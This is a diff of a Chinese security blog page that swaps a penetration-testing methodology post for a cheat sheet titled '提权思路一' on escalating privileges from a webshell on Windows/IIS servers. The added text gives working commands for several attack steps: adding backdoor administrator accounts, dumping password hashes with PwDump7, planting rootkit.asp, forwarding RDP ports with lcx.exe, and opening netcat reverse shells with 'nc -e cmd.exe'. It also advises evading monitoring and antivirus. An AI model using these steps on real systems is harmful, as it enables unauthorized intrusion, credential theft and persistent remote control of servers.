@@ -51,18 +51,17 @@
   };
 </script>
 
-  <meta name="description" content="1.明确目标 1）确定范围：测试的范围，如：IP、域名、内外网、整站or部分模块 2）确定规则：能渗透到什么程度（发现漏洞为止or继续利用漏洞）、时间限制、能否修改上传、能否提权... • 目标系统介绍、重点保护对象及特性。 • 是否允许数据破坏？ • 是否允许阻断业务正常运行？ • 测试之前是否应当知会相关部门接口人？ • 接入方式？外网和内网？ • 测试是发现问题就算成功，还是尽可能的发现多">
-<meta name="keywords" content="渗透测试流程">
+  <meta name="description" content="1、能不能执行cmd就看这个命令：net user，net不行就用net1，再不行就上传一个net到可写可读目录，执行&#x2F;c c:\windows\temp\cookies\net1.exe user 2、cmd命令：systeminfo，看看有没有KB952004、KB956572、KB970483这三个补丁，如果没有，第一个是pr提权，第二个是巴西烤肉提权，第三个是iis6.0提权 3、cmd拒">
 <meta property="og:type" content="article">
-<meta property="og:title" content="渗透测试流程">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;11&#x2F;18&#x2F;%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B&#x2F;index.html">
+<meta property="og:title" content="提权思路一">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;11&#x2F;22&#x2F;%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF%E4%B8%80&#x2F;index.html">
 <meta property="og:site_name" content="ClearLoveの博客">
-<meta property="og:description" content="1.明确目标 1）确定范围：测试的范围，如：IP、域名、内外网、整站or部分模块 2）确定规则：能渗透到什么程度（发现漏洞为止or继续利用漏洞）、时间限制、能否修改上传、能否提权... • 目标系统介绍、重点保护对象及特性。 • 是否允许数据破坏？ • 是否允许阻断业务正常运行？ • 测试之前是否应当知会相关部门接口人？ • 接入方式？外网和内网？ • 测试是发现问题就算成功，还是尽可能的发现多">
+<meta property="og:description" content="1、能不能执行cmd就看这个命令：net user，net不行就用net1，再不行就上传一个net到可写可读目录，执行&#x2F;c c:\windows\temp\cookies\net1.exe user 2、cmd命令：systeminfo，看看有没有KB952004、KB956572、KB970483这三个补丁，如果没有，第一个是pr提权，第二个是巴西烤肉提权，第三个是iis6.0提权 3、cmd拒">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-11-20T06:33:52.819Z">
+<meta property="og:updated_time" content="2019-11-22T06:51:35.112Z">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="http://yoursite.com/2019/11/18/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/">
+<link rel="canonical" href="http://yoursite.com/2019/11/22/%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF%E4%B8%80/">
 
 
 <script id="page-configurations">
@@ -76,7 +75,7 @@
   };
 </script>
 
-  <title>渗透测试流程 | ClearLoveの博客</title>
+  <title>提权思路一 | ClearLoveの博客</title>
   
 
 
@@ -186,7 +185,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/18/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/22/%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF%E4%B8%80/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -199,7 +198,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          渗透测试流程
+          提权思路一
         </h1>
 
         <div class="post-meta">
@@ -208,26 +207,9 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2019-11-18 17:57:00" itemprop="dateCreated datePublished" datetime="2019-11-18T17:57:00+08:00">2019-11-18</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2019-11-20 14:33:52" itemprop="dateModified" datetime="2019-11-20T14:33:52+08:00">2019-11-20</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试方法</span>
-                  </a>
-                </span>
+              <time title="创建时间：2019-11-22 10:58:10 / 修改时间：14:51:35" itemprop="dateCreated datePublished" datetime="2019-11-22T10:58:10+08:00">2019-11-22</time>
             </span>
 
           
@@ -241,87 +223,60 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <pre><code>
-1.明确目标
-1）确定范围：测试的范围，如：IP、域名、内外网、整站or部分模块
-2）确定规则：能渗透到什么程度（发现漏洞为止or继续利用漏洞）、时间限制、能否修改上传、能否提权...
-• 目标系统介绍、重点保护对象及特性。
-• 是否允许数据破坏？
-• 是否允许阻断业务正常运行？
-• 测试之前是否应当知会相关部门接口人？
-• 接入方式？外网和内网？
-• 测试是发现问题就算成功，还是尽可能的发现多的问题？
-• 渗透过程是否需要考虑社会工程？
-3）确定需求：web应用的漏洞(新上线程序)？业务逻辑漏洞（针对业务的）？人员权限管理漏洞（针对人员、权限）？
-根据需求和自己技术能力来确定能不能做、能做多少</pre></code>
+        <pre><code>1、能不能执行cmd就看这个命令：net user，net不行就用net1，再不行就上传一个net到可写可读目录，执行/c c:\windows\temp\cookies\net1.exe user</pre></code>
+<pre><code>2、cmd命令：systeminfo，看看有没有KB952004、KB956572、KB970483这三个补丁，如果没有，第一个是pr提权，第二个是巴西烤肉提权，第三个是iis6.0提权</pre></code>
+<pre><code>3、cmd拒绝访问的话就自己上传一个cmd.exe 自己上传的后缀是不限制后缀的，cmd.exe/cmd.com/cmd.txt 都可以</pre></code>
+<pre><code>4、找sa密码或是root密码，直接利用大马的文件搜索功能直接搜索</pre></code>
+<pre><code>5、c:\windows\temp\cookies\ 这个目录</pre></code>
+<pre><code>6、当提权成功，3389没开的情况下，上传开3389的vps没成功时，试试上传rootkit.asp 用刚提权的用户登录进去就是system权限，再试试一般就可以了</pre></code>
+<pre><code>7、cmd执行exp没回显的解决方法：com路径那里输入exp路径C:\RECYCLER\pr.exe，命令那里清空(包括/c )输入”net user jianmei daxia /add”</pre></code>
+<pre><code>8、增加用户并提升为管理员权限之后，如果连接不上3389，上传rootkit.asp脚本，访问会提示登录，用提权成功的账号密码登录进去就可以拥有管理员权限了</pre></code>
+<pre><code>9、有时变态监控不让添加用户，可以尝试抓管理哈希值，上传“PwDump7 破解当前管理密码(hash值)”，俩个都上传，执行PwDump7.exe就可以了，之后到网站去解密即可</pre></code>
+<pre><code>10、有时增加不上用户，有可能是密码过于简单或是过于复杂，还有就是杀软的拦截，命令 tasklist 查看进程</pre></code>
+<pre><code>11、其实星外提权只要一个可执行的文件即可，先运行一遍cmd，之后把星外ee.exe命名为log.csv 就可以执行了</pre></code>
+<pre><code>12、用wt.asp扫出来的目录，其中红色的文件可以替换成exp，执行命令时cmd那里输入替换的文件路径，下面清空双引号加增加用户的命令</pre></code>
+<pre><code>13、当可读可写目录存在空格的时候，会出现这样的情况：’C:\Documents’ 不是内部或外部命令，也不是可运行的程序 或批处理文件。解决办法是利用菜刀的交互shell切换到exp路径，如：Cd C:\Documents and Settings\All Users\Application Data\Microsoft 目录 然后再执行exp或者cmd，就不会存在上面的情况了，aspshell一般是无法跳转目录的</pre></code>
+<pre><code>14、有时候可以添加用户，但是添加不到管理组，有可能是administrators改名了，net user administrator 看下本地组成员，*administrators</pre></code>
+<pre><code>15、进入服务器，可以继续内网渗透 这个时候可以尝试打开路由器 默认帐号密码 admin admin</pre></code>
+<pre><code>16.有的cmd执行很变态，asp马里，cmd路径填上面，下面填：”"c:\xxx\exp.exe “whoami” 记得前面加两个双引号，不行后面也两个，不行就把exp的路径放在cmd那里，下面不变</pre></code>
+<pre><code>17、一般增加不上用户，或是想添加增加用户的vbs,bat,远控小马到服务器的启动项里，用“直接使服务器蓝屏重启的东东”这个工具可以实现</pre></code>
+<pre><code>18.执行PwDump7.exe抓哈希值的时候，建议重定向结果到保存为1.txt /c c:\windows\temp\cookies\PwDump7.exe >1.txt</pre></code>
+<pre><code>19.菜刀执行的技巧，上传cmd到可执行目录，右击cmd 虚拟终端，help 然后setp c:\windows\temp\cmd.exe 设置终端路径为：c:\windows\temp\cmd.exe</pre></code>
+<pre><code>20.当不支持aspx，或是支持但跨不了目录的时候，可以上传一个读iis的vps，执行命令列出所有网站目录，找到主站的目录就可以跨过去了。 上传cscript.exe到可执行目录，接着上传iispwd.vbs到网站根目录，cmd命令/c “c:\windows\temp\cookies\cscript.exe” d:\web\iispwd.vbs</pre></code>
+<pre><code>21.如何辨别服务器是不是内网？ 192.168.x.x 172.16.x.x 10.x.x.x</pre></code>
+<pre><code>22.什么情况下适合转发端口？
+1.服务器是内网，我们无法连接。 2.服务器上有防火墙，阻断我们的连接。
+转发端口的前提，我们是外网或是有外网服务器。
+找个可读可写目录上传lcx.exe
+本地cmd命令：lcx.exe -listen 1988 4567 （监听本地1988端口并转发到4567端口）
+接着shell命令：/c c:\windows\temp\cookies\lcx.exe -slave 本机ip 1988 服务器ip 3389 （把服务器3389端口转发到本地4567端口）
+之后本地连接：127.0.0.1:4567 (如果不想加上:4567的话，本地执行命令的时候，把4567换成3389来执行就行了)
 
-<pre><code>2.分析风险，获得授权
-分析渗透测试过程中可能产生的风险，如大量测试数据的处理、影响正常业务开展、服务器发生异常的应急、数据备份和恢复、测试人力物力成本...
-由测试方书写实施方案初稿并提交给客户（or本公司内部领导）进行审核。在审核完成后，从客户（or本公司内部领导）获取对测试方进行书面委托授权书，授权测试方进行渗透测试。</pre></code>
+以上是本机外网情况下操作，接着说下在外网服务器里如何操作：
+上传lxc.exe cmd.exe到服务器且同一目录，执行cmd.exe命令：lcx.exe -listen 1988 4567
+接着在aspxshell里点击端口映射，远程ip改为站点的ip，远端口程填1988，点击映射端口，接着在服务器里连接127.0.0.1:4567就可以了</pre></code>
+<pre><code>23.当可以执行net user，但是不能建立用户时，就可以用NC反弹提权试下，特别是内网服务器，最好用NC反弹提权。
+不过这种方法, 只要对方装了防火墙, 或是屏蔽掉了除常用的那几个端口外的所有端口，那么这种方法也失效了….
+找个可读可写目录上传nc.exe cmd.exe
+-l 监听本地入栈信息
+-p port打开本地端口
+-t 以telnet形式应答入栈请求
+-e 程序重定向
+本地cmd执行：nc -vv -l -p 52 进行反弹
+接着在shell里执行命令：c:\windows\temp\nc.exe -vv 服务器ip 999 -e c:\windows\temp\cmd.exe 最好是80或8080这样的端口，被防火墙拦截的几率小很多
+执行成功后本地cmd命令：cd/ （只是习惯而已）
+接着以telnet命令连接服务器：telnet 服务器ip 999
+回车出现已选定服务器的ip就说明成功了，接着权限比较大了，尝试建立用户！
+本地cmd执行：nc -vv -l -p 52 进行反弹 c:\windows\temp\nc.exe -e c:\windows\temp\cmd.exe 服务器ip 52
+shell执行命令c:\windows\temp\nc.exe -l -p 110 -t -e c:\windows\temp\cmd.exe
+一般这样的格式执行成功率很小，不如直接在cmd那里输入：c:\windows\temp\nc.exe 命令这里输入：-vv 服务器ip 999 -e c:\windows\temp\cmd.exe
+这个技巧成功率比上面那个大多了，不单单是nc可以这样，pr这些提权exp也是可以的</pre></code>
+<pre><code></pre></code>
 
-<pre><code>3.信息收集
-在信息收集阶段，我们需要尽量多的收集关于目标web应用的各种信息，比如：脚本语言的类型、服务器的类型、目录的结构、使用的开源软件、数据库类型、所有链接页面，用到的框架等。
-方式：主动扫描；开放搜索
-开放搜索：利用搜索引擎获得后台、未授权页面、敏感url
-基础信息：IP，网段，域名，端口
-系统信息：操作系统版本
-应用信息：各端口的应用，例如web应用，邮件应用等
-版本信息：所有探测到的版本
-服务信息：服务器类型、版本
-人员信息：域名注册人员信息，web应用中网站发帖人的id，管理员姓名等
-防护信息：试着看能否探测到防护设备</pre></code>
 
-<p>4.漏洞探测（手动&amp;自动）</p>
-<pre><code>利用上一步中列出的信息，使用相应的漏洞检测
-方法：
-1）漏扫：AWVS、AppScan...
-2）结合漏洞去exploit-db等位置找利用
-3）在网上寻找验证POC
-内容：
-系统漏洞：系统没有及时打补丁
-Websever漏洞：Websever配置问题
-Web应用漏洞：Web应用开发问题
-其它端口服务漏洞：各种21/8080(st2)/7001/22/3389
-通信安全：明文传输，token在cookie中传送等</pre></code>
 
-<p>5.漏洞验证</p>
-<pre><code>将上一步中发现的有可能可以成功利用的全部漏洞都验证一遍。结合实际情况，搭建模拟环境进行试验，成功后再应用于目标中。
-• 自动化验证：结合自动化扫描工具提供的结果
-• 手工验证：根据公开资源进行验证
-• 试验验证：自己搭建模拟环境进行验证
-• 登录猜解：有时可以尝试猜解一下登陆口的账号密码等信息
-• 业务漏洞验证：如发现业务漏洞，要进行验证
-• 公开资源的利用
-exploit-db/wooyun/
-渗透代码网站
-通用、缺省口令
-厂商的漏洞警告等</pre></code>
 
-<p>6.信息分析</p>
-<pre><code>为下一步实施渗透做准备
-• 精准攻击：准备好上一步探测到的漏洞exp（漏洞利用），用来精准攻击
-• 绕过防御机制：是否有防火墙等设备，如何绕过
-• 定制攻击路径：最佳工具路径，根据薄弱入口，高内网权限位置，最终目标
-• 绕过检测机制：是否有检测机制，流量监控，杀毒软件，恶意代码检测等（免杀）
-• 攻击代码：经过试验得来的代码，包括不限于xss代码，sql注入语句等</pre></code>
 
-<p>7.利用漏洞，获取数据</p>
-<pre><code>• 实施攻击：根据前几步的结果，进行攻击
-• 获取内部信息：基础设施（网络连接，vpn，路由，拓扑等）
-• 进一步渗透：内网入侵，敏感目标
-• 持续性存在：一般对客户做渗透不需要。rookit，后门，添加管理账号，驻扎手法等
-• 清理痕迹：清理相关日志（访问，操作），上传文件等</pre></code>
-
-<p>8.信息整理</p>
-<pre><code>• 整理渗透工具：整理渗透过程中用到的代码，poc，exp等
-• 整理收集信息：整理渗透过程中收集到的一切信息
-• 整理漏洞信息：整理渗透过程中遇到的各种漏洞，各种脆弱位置信息
-目的：为了最后形成报告，形成测试结果使用。</pre></code>
-
-<p>9.形成报告</p>
-<pre><code>• 按需整理：按照之前第一步跟客户确定好的范围，需求来整理资料，并将资料形成报告
-• 补充介绍：要对漏洞成因，验证过程和带来危害进行分析
-修补建议：当然要对所有产生的问题提出合理高效安全的解决办法</pre></code>
     </div>
 
     
@@ -329,24 +284,21 @@ exploit-db/wooyun/
     
 
       <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/" rel="tag"># 渗透测试流程</a>
-          </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-next post-nav-item">
-                <a href="/2019/11/18/%E6%A1%88%E4%BE%8B%E4%B8%80%E6%8F%90%E6%9D%83/" rel="next" title="案例一提权">
-                  <i class="fa fa-chevron-left"></i> 案例一提权
+                <a href="/2019/11/22/%E7%BD%91%E7%AB%99-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E5%9B%BE/" rel="next" title="网站+内网渗透思路图">
+                  <i class="fa fa-chevron-left"></i> 网站+内网渗透思路图
                 </a>
             </div>
 
             <span class="post-nav-divider"></span>
 
             <div class="post-nav-prev post-nav-item">
-                <a href="/2019/11/19/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%80%E5%B7%A7/" rel="prev" title="渗透测试技巧">
-                  渗透测试技巧 <i class="fa fa-chevron-right"></i>
+                <a href="/2019/11/22/%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF%E4%BA%8C/" rel="prev" title="提权思路二">
+                  提权思路二 <i class="fa fa-chevron-right"></i>
                 </a>
             </div>
           </div>
